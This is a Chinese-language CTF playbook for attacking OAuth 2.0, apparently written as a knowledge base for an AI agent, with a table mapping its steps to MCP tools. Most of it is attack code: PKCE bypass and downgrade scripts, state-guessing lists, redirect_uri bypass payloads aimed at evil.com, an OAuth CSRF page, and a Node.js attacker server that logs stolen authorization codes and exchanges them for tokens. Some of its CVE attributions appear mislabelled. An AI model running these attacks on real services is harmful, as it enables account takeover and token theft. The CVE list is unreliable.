# OAuth 2.0 攻击全链

## 场景

目标网站使用 OAuth 2.0 作为认证/授权机制 (通常是 "Sign in with Google/Facebook/GitHub" 或自建 OAuth 服务)。CTF 中 OAuth 攻击的目标通常是: 绕过认证获得其他用户的访问权限、提升权限 (scope escalation)、或窃取 access_token/authorization_code。OAuth 协议的复杂性带来了大量配置实现漏洞，每个环节都可能存在突破口。

## 输入信号

```
OAuth 登录按钮 / 重定向到 /oauth/authorize?response_type=code&client_id=xxx...
URL: redirect_uri 参数值 (一个可被攻击者控制的 URL)
OAuth 回调页面 (通常 /oauth/callback 或 /auth/callback)
已知 client_id 和 client_secret (OAuth public client 无 secret 保护)
response_type 参数: code, token, id_token (可切换)
state 参数: 缺失, 固定值, 或可预测
scope 参数: 默认 scope 列表 (是否有 offline_access, admin 等)
PKCE code_challenge 和 code_challenge_method (是否缺失)
OAuth provider 的漏洞: CSRF on redirect_uri, open redirect
OAuth token 端点的错误响应信息泄露 (Missing grant type, invalid redirect_uri)
```

## 1. PKCE Bypass

### Missing code_challenge Validation

PKCE (Proof Key for Code Exchange) 是为了防止 authorization code 拦截攻击而设计的。但如果服务端验证不完整，PKCE 可被绕过。

```python
# pkce_bypass.py — PKCE 验证绕过

# 场景 1: 服务端不验证 code_challenge
# 攻击者使用正规 OAuth 流程获取 code，但篡改 code_verifier
# 如果服务端未验证 → 任意 code_verifier 都可交换 token

import requests
import base64
import hashlib
import os

class PKCEBypassExploit:
    """PKCE 绕过测试套件"""
    
    def __init__(self, auth_endpoint, token_endpoint, client_id, redirect_uri):
        self.auth_endpoint = auth_endpoint
        self.token_endpoint = token_endpoint
        self.client_id = client_id
        self.redirect_uri = redirect_uri
    
    def test_missing_code_challenge_validation(self):
        """测试服务端是否验证 code_challenge"""
        # 构造正常的 PKCE 请求
        real_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
        real_challenge = base64.urlsafe_b64encode(
            hashlib.sha256(real_verifier.encode()).digest()
        ).rstrip(b'=').decode()
        
        # 用正确的 code_challenge 获取 code
        auth_params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'code_challenge': real_challenge,
            'code_challenge_method': 'S256',
            'state': 'test123',
        }
        # ... 用户认证后获取 code ... (模拟或手动)
        auth_code = "SIMULATED_AUTH_CODE"
        
        # 尝试用错误的 code_verifier 交换 token
        wrong_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
        token_response = requests.post(self.token_endpoint, data={
            'grant_type': 'authorization_code',
            'code': auth_code,
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'code_verifier': wrong_verifier,
        })
        
        if token_response.status_code == 200:
            return {'vulnerable': True, 'note': 'Server does NOT validate code_verifier! PKCE bypassed'}
        return {'vulnerable': False, 'note': 'Server validates code_verifier correctly'}
    
    def test_plain_method_downgrade(self):
        """测试 S256 → plain 降级攻击"""
        verifier = 'plain_verifier_12345'
        challenge = verifier  # plain = challenge 就是 verifier 本身
        
        # 用 S256 方法请求但实际发送 plain 格式的 challenge
        # 或: 用 code_challenge_method=plain 但传入 S256 格式的 challenge
        
        # 场景: 服务端不支持 plain，但接受 code_challenge_method=plain
        # → 实际上 challenge 就是 verifier → 攻击者只要知道 plain challenge 就能交换
        
        return self.test_exchange_with_plain(verifier, challenge)
    
    def test_exchange_with_plain(self, verifier, challenge):
        """使用 plain PKCE 交换"""
        auth_params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'code_challenge': challenge,
            'code_challenge_method': 'plain',
            'state': 'test',
        }
        # ... (同上)
        return {'test': 'plain_pkce_test'}
```

### S256 vs Plain Downgrade

```python
# PKCE 降级攻击的技术细节:
# S256 = SHA256(code_verifier) → 服务端应该只接受 S256
# Plain = code_verifier 直接作为 challenge → 如果是明文传输，MITM 可以直接读取

# 降级攻击:
# 1. 攻击者拦截 authorization request
# 2. 将 code_challenge_method=S256 改为 code_challenge_method=plain
# 3. 同时将 code_challenge 替换为可预测的值
# 4. 服务端如果接受 plain → 攻击者可以预测验证值

# 另一个变种: 同时发送两种方法
# ?code_challenge=xxx&code_challenge_method=S256&code_challenge_method=plain
# 服务端可能取最后一个参数 (plain) → 降级成功
```

## 2. State Parameter: Missing, Fixed, Predictable

```python
# oauth_state_attack.py — State 参数安全分析

class OAuthStateAttack:
    """OAuth state 参数攻击"""
    
    def test_missing_state(self, auth_url):
        """测试缺失 state → CSRF on OAuth callback"""
        # 场景: 攻击者诱导受害者点击攻击者的 OAuth 链接
        # 受害者认证后 → code 被发送到攻击者的 redirect_uri?
        # 不, redirect_uri 还是攻击者的。但:
        
        # 实际攻击: OAuth CSRF
        # 攻击者:
        # 1. 用自己的账号走 OAuth 流程获取 auth code
        # 2. 构造恶意 URL: /oauth/callback?code=ATTACKER_CODE
        # 3. 诱导受害者访问该 URL
        # 4. 服务端用 ATTACKER_CODE 交换 token → 受害者账号绑定了攻击者的 OAuth 账号
        
        # 防御: state 参数绑定到用户 session
        # 如果 state 缺失或可预测 → CSRF 攻击
        
        return {
            'attack': 'OAuth CSRF (Account Binding)',
            'scenario': '如果 state 缺失，攻击者可强制绑定自己 OAuth 账号到受害者账号',
            'payload': f'/oauth/callback?code=STOLEN_CODE&state=',
        }
    
    def test_fixed_state(self, client):
        """测试固定 state 值"""
        # 很多 CTF 题目使用固定 state "csrf_token" 或 UUID 版本 1
        # 如果 state 是 "csrf" 或 "state" → 可预测
        # 如果 state 使用时间戳 → 可在一定窗口中预测
        
        common_states = [
            'state', 'csrf', 'csrf_token', 'token', 'oauth_state',
            '1234567890', '0000000000', 'test', '1',
        ]
        return common_states
    
    def state_prediction(self, sample_states):
        """如果采集到多个 state 样本，尝试预测模式"""
        # UUIDv1: 基于时间戳 + MAC 地址
        # 连续采集 2 个 → 可预测后续 UUID
        # 时间戳: 如果 state 是 Unix 时间戳 → 可预测
        
        import datetime
        for s in sample_states:
            try:
                ts = int(s)
                dt = datetime.datetime.fromtimestamp(ts)
                # 如果是有效时间 → state 是时间戳 → 可预测
                return {'predictable': True, 'type': 'timestamp', 'sample': s}
            except:
                pass
        return {'predictable': False}
```

### OAuth CSRF — Account Takeover via State Bypass

```html
<!-- oauth_csrf_attack.html -- CSRF via OAuth callback -->
<!-- 场景: 目标使用 OAuth 登录，state 缺失或可预测 -->
<!-- 攻击者步骤: -->
<!-- 1. 用自己的账号走完 OAuth flow，获得 code -->
<!-- 2. 构造以下页面，诱导受害者访问 -->

<script>
// 诱导受害者访问:
// window.location = 'https://target.com/oauth/callback?code=ATTACKER_CODE&state=PREDICTABLE';
// 如果受害者已登录 target.com:
// → target.com 用 ATTACKER_CODE 换 token
// → 受害者账号绑定攻击者的 Google/Facebook 账号
// → 攻击者登录后直接访问受害者账号所有数据
</script>
```

## 3. redirect_uri 攻击

### Open Redirect Chaining

```python
# redirect_uri_attack.py — 重定向 URI 攻击

# 场景: 服务端验证 redirect_uri 前缀匹配或宽松匹配
# 白名单: https://target.com/oauth/callback

# 绕过方法:
class RedirectURIBypass:
    """redirect_uri 验证绕过技术"""
    
    TECHNIQUES = {
        # 1. 路径遍历
        'path_traversal': [
            'https://target.com/oauth/callback/../evil',
            'https://target.com/oauth/callback/..%2fevil',
            'https://target.com/oauth/callback%2f..%2fevil',
        ],
        # 2. 子域名接管
        'subdomain_open_redirect': [
            'https://evil.target.com/oauth/callback',
            'https://target.com.evil.com/oauth/callback',
        ],
        # 3. 参数污染
        'parameter_pollution': [
            'https://target.com/oauth/callback?redirect=https://evil.com',
            'https://target.com/oauth/callback?url=https://evil.com',
            'https://target.com/oauth/callback#https://evil.com',
        ],
        # 4. 端口绕过
        'port_bypass': [
            'https://target.com:443/oauth/callback@evil.com',
            'https://target.com:8080/oauth/callback',
        ],
        # 5. 文件名绕过
        'filename_bypass': [
            'https://target.com/oauth/callback.html.evil.com',
            'https://target.com/oauth/callback.evil.com',
        ],
        # 6. 协议混淆
        'protocol_confusion': [
            'http://target.com/oauth/callback',  # HTTPS → HTTP 降级
            '//evil.com/https://target.com/oauth/callback',
        ],
        # 7. 反斜杠
        'backslash_bypass': [
            'https://target.com/oauth/callback\@evil.com',
            'https://target.com/oauth/callback\..\evil',
        ],
        # 8. @ 符号
        'at_symbol': [
            'https://target.com:oauth/callback@evil.com',
            'https://target.com%2foauth%2fcallback@evil.com',
        ],
        # 9. null 字符
        'null_char': [
            'https://target.com/oauth/callback%00@evil.com',
            'https://target.com/oauth/callback%0a%0d@evil.com',
        ],
        # 10. 双斜杠
        'double_slash': [
            'https://target.com//oauth/callback//evil.com/',
        ],
    }
    
    @staticmethod
    def test_redirect_uri(oauth_endpoint: str, client_id: str, redirect_uri: str) -> bool:
        """测试 redirect_uri 是否可通过"""
        import requests
        
        params = {
            'response_type': 'code',
            'client_id': client_id,
            'redirect_uri': redirect_uri,
            'state': 'test',
        }
        
        r = requests.get(oauth_endpoint, params=params, allow_redirects=False)
        # 302 Location 设置为 redirect_uri → 通过验证
        # 或返回错误信息 → 未通过
        
        if r.status_code == 302:
            return True
        return False
```

### Open Redirect to Token Theft

```html
<!-- redirect_uri + open redirect → 窃取 authorization code -->

<!-- 如果目标 redirect_uri 白名单中包含有 open redirect 的端点 -->
<!-- https://target.com/redirect?to=ATTACKER_URL -->
<!-- 验证通过后?code=xxx 被追加到 redirect_uri 尾部 -->

<!-- 攻击构造: -->
<!-- redirect_uri=https://target.com/redirect?to=https://attacker.com/ -->
<!-- 认证后浏览器跳转到: -->
<!-- https://target.com/redirect?to=https://attacker.com/?code=AUTH_CODE -->

<!-- target.com/redirect 服务执行 302 → -->
<!-- Location: https://attacker.com/?code=AUTH_CODE -->

<!-- 攻击者服务器记录 code → 交换 token → 完全接管 -->
<script>
// 攻击者服务器 (Node.js)
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
    const query = url.parse(req.url, true).query;
    if (query.code) {
        console.log('STOLEN CODE:', query.code);
        // 立即用此 code 交换 access_token
        fetch('https://target.com/oauth/token', {
            method: 'POST',
            body: new URLSearchParams({
                grant_type: 'authorization_code',
                code: query.code,
                client_id: 'ATTACKER_CLIENT_ID',
                client_secret: 'ATTACKER_CLIENT_SECRET',
                redirect_uri: 'https://attacker.com/callback',
            })
        });
    }
    res.end('logged');
}).listen(80);
</script>
```

## 4. response_type Switching

```python
# response_type_switch.py — 切换 response_type 绕过

# OAuth 2.0 支持多种 response_type:
# code      → Authorization Code Flow (最安全，带 PKCE)
# token     → Implicit Flow (已弃用，危险)
# id_token  → OpenID Connect implicit flow
# code token → Hybrid Flow (混合)

# 攻击 1: code → token 切换
# 如果 client 配置为 authorization_code grant
# 但授权端点接受 response_type=token → 返回 access_token 在 fragment 中
# → 绕过 authorization code 的 CSRF 保护 (因为没有 code exchange 步骤)
# → token 直接暴露在 URL fragment 中 → Referer 头泄露

# 攻击 2: code → id_token 切换
# 如果授权端点接受 response_type=id_token
# → 返回 id_token (JWT)
# → id_token 可能包含敏感信息 (用户 email、权限等)
# → 攻击者直接读取 id_token 中的 claims

# 攻击 3: response_type=code token
# → 同时返回 code + access_token
# → access_token 在 fragment → Referer 泄露
# → code 可用于 server-side exchange

def test_response_type_switch(auth_endpoint, client_id, redirect_uri):
    """测试各种 response_type 组合"""
    test_types = ['code', 'token', 'id_token', 'code%20token', 'code%20id_token']
    
    for resp_type in test_types:
        params = {
            'response_type': resp_type,
            'client_id': client_id,
            'redirect_uri': redirect_uri,
            'state': 'test',
            'scope': 'openid profile',
        }
        r = requests.get(auth_endpoint, params=params, allow_redirects=False)
        if r.status_code == 302:
            location = r.headers.get('Location', '')
            if 'access_token=' in location:
                print(f"[!] response_type={resp_type} returns access_token (implicit flow supported)")
            if 'code=' in location:
                print(f"[+] response_type={resp_type} returns authorization code")
```

## 5. Scope Escalation

```python
# scope_escalation.py — OAuth 权限提升

class ScopeEscalation:
    """OAuth scope 提升攻击"""
    
    # 常见 OAuth scope 及其风险
    SCOPES = {
        'openid':           'Basic profile info (low risk)',
        'profile':          'Full profile (medium)',
        'email':            'Email address (medium)',
        'user:email':       'Read user email (GitHub)',
        'repo':             'Full repo access (high)',
        'admin:org':        'Organization admin (critical)',
        'offline_access':   'Refresh token (critical — persistent access)',
        'https://www.googleapis.com/auth/cloud-platform':  'GCP admin (critical)',
        'write:posts':      'Write posts on behalf (high)',
        'delete:posts':     'Delete posts (high)',
    }
    
    def test_scope_escalation(self, auth_endpoint, client_id, redirect_uri, default_scope):
        """测试 scope 是否可以提升"""
        
        # 方法 1: 添加额外 scope
        additional_scopes = [
            'admin', 'admin:org', 'offline_access',
            'repo', 'delete_repo', 'user',
            'https://www.googleapis.com/auth/admin.directory.user',
            'https://www.googleapis.com/auth/cloud-platform',
        ]
        
        for extra in additional_scopes:
            params = {
                'response_type': 'code',
                'client_id': client_id,
                'redirect_uri': redirect_uri,
                'state': 'test',
                'scope': f'{default_scope} {extra}',
            }
            r = requests.get(auth_endpoint, params=params, allow_redirects=False)
            if r.status_code == 302:
                print(f"[!] scope={default_scope} {extra} accepted! Escalation possible")
        
        # 方法 2: scope 删除攻击 (如果只有特定 scope 才有安全限制)
        # 删除 offline_access → 不返回 refresh_token → 但 access_token 可能永久有效
        
        # 方法 3: scope 字符混淆
        # admin → aDmin → 不同的 OAuth provider 可能不同处理
        # 大小写、URL 编码、Unicode 同形字
```

## 6. Implicit Flow — Token Leakage

```html
<!-- implicit_flow_leak.html — Implicit Flow token 泄露向量 -->

<!-- 场景: OAuth provider 仍支持 Implicit Flow (response_type=token) -->
<!-- access_token 返回在 URL fragment (#access_token=xxx) -->

<!-- 泄露向量 1: Referer 头 -->
<!-- 目标页面跳转到攻击者页面 → Referer: https://target.com/callback#access_token=xxx -->
<!-- 但 fragment 不在 Referer 中！→ 等等，有些老浏览器会包含 fragment -->
<!-- 更重要的是: 如果 redirect_uri 页面又重定向 → Referer 包含完整 URL -->

<!-- 泄露向量 2: Service Worker -->
<!-- 攻击者在目标域上注册 Service Worker (通过 XSS 或 MITM) -->
<!-- Service Worker 可以拦截所有 fetch 请求 → 提取 fragment -->

<!-- 泄露向量 3: window 引用 -->
<!-- 受害者通过 window.open 打开 OAuth 窗口 -->
<!-- OAuth 页面跳转到 redirect_uri → #access_token=xxx -->
<!-- 攻击者的页面可以读取: -->
<script>
// 如果攻击者也控制了 redirect_uri 页面
// → window.location.href 包含 fragment 中的 token
// 如果 window.open 返回的引用在同一域

// 或者通过:
// 1. 监听 window 的 hashchange 事件
// 2. 定时检查 window.location.href
// 但不能跨域读取!

// 除非:
// 攻击者注册相同的 origin (subdomain takeover)
// 或 redirect_uri 页面有 XSS
</script>

<!-- 泄露向量 4: 浏览器历史 -->
<!-- URL fragment 被保存在浏览器历史中 -->
<!-- 如果用户从 OAuth 回调页面导航到攻击者页面 -->
<!-- 攻击者可以通过 history.length 变化推断? 不能直接读 -->
```

## 7. Authorization Code Interception via Malicious App

```python
# code_interception.py — 授权码拦截的多种路径

# 路径 1: 恶意 App 注册同 redirect_uri
# 在公共客户端 (Native App, SPA) 中，redirect_uri 使用自定义 URL scheme
# 如: myapp://oauth/callback
# 攻击者注册相同的 scheme → 拦截 code

# 路径 2: Android App Link / iOS Universal Link 冲突
# 多个 App 注册相同的 HTTPS link → 系统弹出的选择器可能泄露 code

# 路径 3: 反向代理 / MITM
# 如果 redirect_uri 使用 HTTP 而非 HTTPS
# 或者在 HTTPS 页面中加载 HTTP 资源
# → 中间人可读取 URL 参数

# 路径 4: OAuth provider 的 redirect_uri 宽松匹配
# redirect_uri=https://target.com/oauth/callback
# 实际可用: https://target.com/oauth/callback/anything
# → 攻击者找到 target.com 上的任意 open redirect 端点即可
```

## 8. Real CVEs and Research

```
# CVE-2022-22965 (Spring4Shell related OAuth bypass)
# OAuth 2.0 结合 Spring Security 时的配置缺陷

# CVE-2021-41267: Discourse OAuth CSRF
# state 参数验证缺失 → OAuth 账号绑定 CSRF

# CVE-2020-5275: Symfony OAuth state validation bypass
# state 验证逻辑缺陷 → 允许任意 state

# CVE-2019-13164: Oxidized (GitHub OAuth)
# redirect_uri 验证为 url.parse(url).host !== null check
# → 使用 //evil.com 绕过

# Google OAuth 漏洞 (2017): "OAuth 0-Day"
# 通过 "Login with Google" 的 redirect_uri 白名单中包含
# https://www.googleapis.com/+/c 在内的多个开放重定向端点
# → 窃取任意 Google 账号的 access_token

# Facebook OAuth 漏洞 (2018): scope 提升
# 通过添加 manage_pages 和 pages_manage_ads → 控制任意商业账号

# Twitch OAuth 漏洞 (2021): Authorization code reuse
# code 在短时间内可多次使用 → 攻击者通过 CSRF 触发多次 token exchange

# GitLab OAuth 漏洞 (CVE-2022-3032):
# redirect_uri 验证被绕过 → token 窃取 → 账号接管

# OAuth 2.0 Security Best Current Practice (BCP)
# RFC 9700 — 已废弃 Implicit Flow 并建议所有客户端使用 PKCE
# 很多旧实现尚未更新 → 可利用
```

## 9. OAuth Flow Testing Harness

```python
# oauth_test_harness.py — OAuth 流程全面测试框架

import requests
from urllib.parse import urlparse, parse_qs

class OAuthSecurityTester:
    """OAuth 2.0 安全测试框架"""
    
    def __init__(self, config):
        self.auth_endpoint = config['auth_endpoint']
        self.token_endpoint = config['token_endpoint']
        self.client_id = config['client_id']
        self.client_secret = config.get('client_secret', '')
        self.redirect_uri = config['redirect_uri']
        self.scope = config.get('scope', 'openid profile')
    
    def test_all(self):
        """运行所有安全测试"""
        results = {}
        
        # PKCE 验证测试
        results['pkce_bypass'] = self._test_pkce_bypass()
        
        # redirect_uri 白名单测试
        results['redirect_uri'] = self._test_redirect_uri_fuzzing()
        
        # response_type 切换测试
        results['response_type'] = self._test_response_type_switching()
        
        # scope 提升测试
        results['scope_escalation'] = self._test_scope_escalation()
        
        # state 验证测试
        results['state_validation'] = self._test_state_validation()
        
        # token 端点安全测试
        results['token_endpoint'] = self._test_token_endpoint()
        
        # code 重用测试
        results['code_reuse'] = self._test_code_reuse()
        
        return results
    
    def _test_token_endpoint(self):
        """测试 token 端点安全"""
        tests = []
        
        # 测试 1: 无效 grant_type
        for gt in ['', 'invalid', 'password', 'client_credentials']:
            r = requests.post(self.token_endpoint, data={
                'grant_type': gt,
                'client_id': self.client_id,
            })
            # 检查是否信息泄露 (stack trace, SQL error, etc.)
            tests.append({'grant_type': gt, 'status': r.status_code, 'body_preview': r.text[:200]})
        
        return tests
    
    def _test_code_reuse(self):
        """测试 authorization code 是否可以多次使用"""
        # 获取一个有效 code (手动或模拟)
        # 多次向 token 端点提交该 code
        # 如果第二次也成功 → code reuse 漏洞
        pass
```

### PKCE Downgrade Attack Script

```python
# pkce_downgrade.py — PKCE S256 → Plain 降级完整 PoC

import secrets
import hashlib
import base64
import requests

def pkce_downgrade_attack(auth_url, token_url, client_id, redirect_uri):
    """
    完整的 PKCE 降级攻击流程
    
    条件:
    1. OAuth 服务器接受 code_challenge_method=plain
    2. 攻击者可监听或控制客户端到服务器的通道
    """
    
    # 步骤 1: 构造攻击者控制的 PKCE 参数 (plain mode)
    # 攻击者选择固定的 verifier → 挑战值 = verifier
    attacker_verifier = base64.urlsafe_b64encode(
        secrets.token_bytes(32)
    ).rstrip(b'=').decode()
    
    # plain: challenge = verifier
    attacker_challenge = attacker_verifier  
    
    # 步骤 2: 拦截客户端的 authorization request
    # 将 code_challenge_method=S256 替换为 plain
    # 将 code_challenge=REAL_CHALLENGE 替换为 attacker_challenge
    
    # 步骤 3: 用户认证后，服务端返回 code
    # code 绑定到我们的 challenge
    
    # 步骤 4: 用 attacker_verifier 交换 token
    token_resp = requests.post(token_url, data={
        'grant_type': 'authorization_code',
        'code': 'STOLEN_CODE',
        'client_id': client_id,
        'redirect_uri': redirect_uri,
        'code_verifier': attacker_verifier,
    })
    
    if token_resp.status_code == 200:
        return {
            'success': True,
            'access_token': token_resp.json().get('access_token'),
            'refresh_token': token_resp.json().get('refresh_token'),
        }
    return {'success': False}
```

## 攻击链

```
PKCE missing validation + code interception → code_verifier 任意 → token 窃取
PKCE S256 → plain 降级 → verifier 可预测 → token 交换
State 缺失 → OAuth CSRF → 攻击者账号绑定受害者 → 账号接管
State 可预测 → CSRF token 猜测 → 强制绑定 → 跨用户账号关联
redirect_uri 开放重定向 → code 被发送到攻击者 → code exchange → 完全接管
redirect_uri 路径遍历 → 绕过白名单 → code 窃取
response_type code → token 切换 → fragment 泄露 → Referer 窃取
Scope 提升 → 默认 scope 之外的权限 → 额外功能访问
Offline_access 滥用 → refresh_token 永久有效 → 长期后门
Authorization code reuse → 同一 code 多次 token exchange → 持久化访问
Client_secret 硬编码 (SPA) → 冒充合法客户端 → 任意用户授权
```

## 证据

记录: 完整的 OAuth 流程 URI、redirect_uri 白名单、response_type 支持情况、PKCE 验证状态、state 参数、测试的 scope 列表、成功泄露的 token (脱敏)、token 响应内容。

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| OAuth 端点探测 | `http_probe` | HTTP GET 探测 OAuth 相关端点 |
| OAuth 知识检索 | `kb_router` | 按 OAuth/PKCE/redirect_uri 搜索知识库 |
| 技术文件阅读 | `kb_read_file` | 读取具体 OAuth 攻击的详细代码 |
| JWT/OAuth 工具 | `run_ctf_tool` | jwt_tool 解析 OAuth id_token |
